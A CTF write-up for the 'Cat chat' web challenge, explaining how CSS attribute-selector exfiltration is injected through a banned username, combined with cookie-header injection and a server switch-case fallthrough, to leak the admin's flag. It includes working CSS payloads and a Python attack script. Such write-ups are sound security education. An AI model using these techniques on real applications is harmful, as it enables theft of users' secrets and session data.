# Cat chat (web 210p, 46 solved)

In the task we get access to a web-based chat application.
We automatically join a random channel, and we can use the link with room number to invite more people to the chat.
The whole chat is implemented in javascript and apart from [client code](client.js) we also get [server code](server.js).

The chat, besides the obvious message sending function, has also some special commands:

- `/name YourNewName` - Change your nick name to YourNewName.
- `/report` - Report dog talk to the admin.

And if we look into the source code we get also information on admin commands:

- `/secret asdfg` - Sets the admin password to be sent to the server with each command for authentication. It's enough to set it once a year, so no need to issue a /secret command every time you open a chat room.
- `/ban UserName` - Bans the user with UserName from the chat (requires the correct admin password to be set).

If we use `/report` command admin comes to the chat, and leaves after a moment.
If any of the users meanwhile says `dog`, this user will get banned.
Ban is implemented only client-side, managed by a cookie, so we can un-ban our user simply by removing the cookie.

From the sources the first important part is the location of the flag, visible in the source code of the server code for handling `/secret` command:

```javascript
      case '/secret':
        if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
```

If someone issues this command, then server sends a cookie `flag` with a designated value.
From the description of the command we can guess that admin already has this cookie set, so our goal is to steal the cookie.
We notice here that there is a injection that allows us to add more parameters to the cookie header, so theoretically we could set secret with value `; Path=/whatever;` and thus overwrite the original intended cookie Path parameter.
This is useful, because it means we could use `/secret something; domain=gooe.com` to avoid setting a new cookie, so we won't overwrite the original flag someone might have stored in the cookie.
Stealing cookie would seem like a classic XSS task, however if we check the `Content Security Policy` header we can see that the whole application has:

```
default-src 'self'; 
style-src 'unsafe-inline' 'self'; 
script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; 
frame-src 'self' https://www.google.com/recaptcha/
```

So there is no way we can run any javascript there without a reflected xss somewhere on the website.
However, we can notice that there is a chance to load a inline CSS.

But once we analyse the client code, we notice that the cookie is not the only place where the flag might be present.
In the client-side handler for server messages we can see:

```javascript
secret(data) { display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`); },
```

So if a `/secret` command is issued, the server responds with `secret` message, and client will show a `span` with flag in it.
Moreover, the flag is actually value of attribute `data-secret` of tag `span`.
We've written already a bit about exfiltrating data from html tags attributes via CSS in https://github.com/p4-team/ctf/tree/master/2018-01-20-insomnihack/web_css and here we have a very similar case.

If we could inject CSS style somewhere on the page, we could place:

```css
span[data-secret^={letter} i]{{background: url({some_url}?msg={letter})}}
``` 

Every user for whom this style is applied, would make a request on URL we provide, assuming the secret data match the letter we selected.
In our case we can't use just any URL, because CSP will not allow sending the request "outside", but fortunately we can use url `/room/{room_id}/send?name=leaker&msg={letter}` and the data will appear as message on the chat in the room we select.
We can make a lot of those style entries, one for each letter of the flags charset, and thus recover the first letter of the secret.
Then we can simply match two letters, then three etc.

We're now left with two problems:
- We have to find a way to inject the CSS on the page
- We have to find a way to convince admin to issue `/secret` command.

Solution to the first problem can be found in the code handling banned users:

```javascript
    ban(data) {
      if (data.name == localStorage.name) {
        document.cookie = 'banned=1; Path=/';
        sse.close();
        display(`You have been banned and from now on won't be able to receive and send messages.`);
      } else {
        display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
      }
    }
```

If we look closely at the `else` case, we can notice that DOM of the page will get extended with `<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`, and we control the `data.name` parameter, since it's the username of banned user.

We can, therefore, use a name which closes the opening style tags and adds new ones, for example:

```
/name a i]{}] span[data-secret^=C i]{{background: url(/room/{room_id}/send?name=leaker&msg=C)}}span[data-name^=whatever
```

This way we can inject exfiltration CSS code, which will get triggered if any of users present on the chat have the secret displayed on the screen and it starts with `C`.
The only thing we need to trigger this is to call an admin and convince him to ban the user.

Now we come to the last issue, how to convince admin to issue `/secret` command.
This is a bit funny, because we've seen in writeups of some other teams, that they got this part all wrong, and their solution worked purely by accident.

We've spent quite a while on this step, because we knew from the start that simply forcing admin to send message `/secret something` to the chat won't work, contrary to what some other teams claim.
We tested this on a standard user, and we confirmed in the source code that such action will NOT cause the secret to appear on the chat.
The reason is quite trivial really, if we look at the sever code for handling this action:

```javascript
      case '/secret':
        if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
```

There is no broadcast here!
The response is never send via SSE, and therefore it will not get handled on the client side by the event handler which causes the secret to be added to DOM of the page.

So how come it actually worked for some other teams?
Pure coincidence.
The real vulnerability is in the event handling function on the server side:

```javascript
    switch (msg.match(/^\/[^ ]*/)[0]) {
      case '/name':
        if (!(arg = msg.match(/\/name (.+)/))) break;
        response = {type: 'rename', name: arg[1]};
        broadcast(room, {type: 'name', name: arg[1], old: name});
      case '/ban':
        if (!(arg = msg.match(/\/ban (.+)/))) break;
        if (!req.admin) break;
        broadcast(room, {type: 'ban', name: arg[1]});
      case '/secret':
        if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
      case '/report':
        if (!(arg = msg.match(/\/report (.+)/))) break;
        var ip = req.headers['x-forwarded-for'];
        ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
        response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
    }
```

We have a long switch-case block here, but there is no `break` anywhere!
Handling a single action does not stop the execution flow, it just falls through.
This means if packet `/name xx /ban yy /secret zz` comes to the server, all of those commands will get executed!

If we now check how the ban command is issued by admin on the client side:

```javascript
send(`/ban ${name}`);
```

We can see that we can easily set a special name which contains `/secret something; domain=gooe.com` string in it, and if admin bans such user, he will automatically issue `/secret` command.

This is the reason why it worked for so many teams. 
It had nothing to do with forcing admin to load a style from `/room/{room_id}/send?name=admin&msg=/secret xx` when banning a user, but simply the ban command contained the `/secret xx` string, and thus the command got executed by the handler on server side.

Our attack approach at this point is quite clear:

1. Create a user named `/secret something; domain=gooe.com`
2. Create a user with CSS exfiltration name.
3. Place one more user on the channel, to listen for flag characters.
4. Call admin via `/report`
5. Send `dog` message from the first user, get him banned and force admin to issue `/secret` command
6. Send `dog` message from the second user, get him banned and force admin to leak first character of the flag

We can then repeat those steps for 2nd, 3rd and next flag characters.
We've made a semi-automatic script for this, which required human intervention to collect the recaptcha token to call admin:

```python
import time

from requests import get
from requests import session

FLAG_CHARSET = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&()*+,-./:;<=>?@[\\]^_|~ '
CSS_HACK = """span[data-secret^={letter} i]{{background: url(/room/{room_id}/send?name=admin&msg={letter})}}"""
ROOM_ID = 'fe1fc600-c41b-454f-85eb-e5f03da8b435'
URL = 'https://cat-chat.web.ctfcompetition.com/room/{room_id}/'.format(room_id=ROOM_ID)


def send_message(session, name, message):
    return session.get(URL + 'send', params={'name': name, 'msg': message}, headers={'Referer': URL})


def change_name(session, new_name):
    return send_message(session, 'python_bot', "/name %s" % new_name)


def main():
    flag_payload = '/name a i]{}]'
    flag_payload += ''.join([CSS_HACK.format(room_id=ROOM_ID, letter=x) for x in FLAG_CHARSET])
    flag_payload += 'span[data-name^=whatever'
    captcha = raw_input('captcha code:')
    r = get(URL + 'send', params={'name': 'bzorp', 'msg': '/report %s' % captcha}, headers={'Referer': URL})
    time.sleep(1)
    cookier = session()
    cookier.get(URL)
    change_name(cookier, '/secret something; domain=gooe.com')
    send_message(cookier, '/secret something; domain=gooe.com', 'dog')
    time.sleep(2)
    flag_stealer = session()
    flag_stealer.get(URL)
    send_message(flag_stealer, flag_payload, 'dog')

main()
```

Running this mutiple times, expanding the flag prefix each time gives us: `CTF{L0LC47S_43V3R}`
